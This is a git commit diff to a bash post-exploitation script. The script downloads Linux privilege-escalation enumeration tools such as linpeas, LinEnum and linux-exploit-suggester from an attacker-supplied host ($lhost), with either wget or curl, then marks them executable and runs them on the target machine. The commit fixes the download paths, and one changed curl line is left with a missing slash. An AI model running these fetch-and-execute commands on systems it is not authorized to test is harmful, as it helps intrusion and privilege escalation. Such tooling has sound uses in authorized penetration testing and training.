939c65d5f202659ea8ed7137a1fdc2c986b9314f
Otosan1554 <52628890+Otosan1554@users.noreply.github.com>
2022-01-15 19:25:18 -0500

    Update script_linux.sh

--- linux-script/script_linux.sh
+++ linux-script/script_linux.sh
@@ -24,42 +24,42 @@ if [ $input =  "wget" ] ; then
    set -x
 ##### LinEnum Section #######
    cd $(pwd)
-   wget http://"$lhost":80/linux/script/LinEnum.sh
+   wget http://"$lhost":80/linux-script/LinEnum.sh
    chmod 700 LinEnum.sh
    ./LinEnum.sh -t > LinEnum.txt 2>&1
 #############################
 
 ##### LinPEAS Section #######
    cd $(pwd)
-   wget http://"$lhost":80/linux/script/linpeas.sh
+   wget http://"$lhost":80/linux-script/linpeas.sh
    chmod 700 linpeas.sh
    ./linpeas.sh > linpeas.txt  2>&1
 #############################
 
 ##### Linux Exploit Suggester Section #######
    cd $(pwd)
-   wget http://"$lhost":80/linux/script/linux-exploit-suggester-2.pl
+   wget http://"$lhost":80/linux-script/linux-exploit-suggester-2.pl
    chmod 700 linux-exploit.suggester-2.pl
    ./linux-exploit-suggester-2.pl > linux-exploit-suggester-2.txt  2>&1
 #############################
 
 ##### Linux Privchecker Section #######
    cd $(pwd)
-   wget http://"$lhost":80/linux/script/linuxprivchecker.py
+   wget http://"$lhost":80/linux-script/linuxprivchecker.py
    chmod 700 linuxprivchecker.py
    ./linuxprivchecker.py > linuxprivchecker.txt  2>&1
 #######################################
 
 ##### Linux Lse Section #######
    cd $(pwd)
-   wget http://"$lhost":80/linux/script/lse.sh
+   wget http://"$lhost":80/linux-script/lse.sh
    chmod 700 lse.sh
    ./lse.sh -i -l 2 > lse.txt  2>&1
 ###############################
 
 ##### Linux Unix Privesc Section #######
    cd $(pwd)
-   wget http://"$lhost":80/linux/script/unix-privesc-check.sh
+   wget http://"$lhost":80/linux-script/unix-privesc-check.sh
    chmod 700 unix-privesc-check.sh
    ./unix-privesc-check.sh > unix-privesc-check.txt  2>&1
 ########################################
@@ -71,42 +71,42 @@ if [ $input =  "curl" ] ; then
    set -x
 ##### LinEnum Section #######
    cd $(pwd)
-   curl -OL http://"$lhost":80/linux/script/LinEnum.sh
+   curl -OL http://"$lhost":80linux-script/LinEnum.sh
    chmod 700 LinEnum.sh
    ./LinEnum.sh > LinEnum.txt  2>&1
 #############################
 
 ##### LinPEAS Section #######
    cd $(pwd)
-   curl -OL http://"$lhost":80/linux/script/linpeas.sh
+   curl -OL http://"$lhost":80/linux-script/linpeas.sh
    chmod 700 linpeas.sh
    ./linpeas.sh > linpeas.txt  2>&1
 #############################
 
 ##### Linux Exploit Suggester Section #######
    cd $(pwd)
-   curl -OL http://"$lhost":80/linux/script/linux-exploit.suggester-2.pl
+   curl -OL http://"$lhost":80/linux-script/linux-exploit.suggester-2.pl
    chmod 700 linux-exploit.suggester-2.pl
    ./linux-exploit.suggester-2.pl > linux-exploit-suggester-2.txt  2>&1
 #############################
 
 ##### Linux Privchecker Section #######
    cd $(pwd)
-   curl -OL http://"$lhost":80/linux/script/linuxprivchecker.py
+   curl -OL http://"$lhost":80/linux-script/linuxprivchecker.py
    chmod 700 linuxprivchecker.py
    ./linuxprivchecker.py > linuxprivchecker.txt  2>&1
 #######################################
 
 ##### Linux Lse Section #######
    cd $(pwd)
-   curl -OL http://"$lhost":80/linux/script/lse.sh
+   curl -OL http://"$lhost":80/linux-script/lse.sh
    chmod 700 lse.sh
    ./lse.sh > lse.txt  2>&1
 ###############################
 
 ##### Linux Unix Privesc Section #######
    cd $(pwd)
-   curl -OL http://"$lhost":80/linux/script/unix-privesc-check.sh
+   curl -OL http://"$lhost":80/linux-script/unix-privesc-check.sh
    chmod 700 unix-privesc-check.sh
    ./unix-privesc-check.sh > unix-privesc-check.txt  2>&1
 ########################################
